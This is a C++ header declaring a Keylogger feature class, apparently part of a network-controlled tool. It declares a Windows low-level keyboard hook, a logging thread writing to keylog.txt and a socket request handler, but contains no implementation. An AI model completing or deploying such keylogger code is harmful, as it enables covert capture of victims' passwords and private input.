#pragma once
#include <atomic>
#include <string>

#include "RequestHandler.hpp"

class Keylogger : public FeatureHandler {
public:
    constexpr static int REQUEST_KEY = 0x01;
    constexpr static std::string KEYLOG_FILENAME = "keylog.txt";
    static std::atomic_bool isKeyloggerRunning;
    static FILE *keylogFile;
    static HANDLE hThread;
    static DWORD  dwThreadID;
    static HHOOK hKeyboardHook;
    static HINSTANCE hKeyboardInstance;
    static std::atomic_bool isShiftPressed;
    static std::atomic_bool isCapsLockOn;
    static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam);
    static DWORD WINAPI SKeylogger(LPVOID *);
    static void StopKeylogger();
    void HandleRequest(SOCKET client_socket, const PacketHeader &header) override;
};
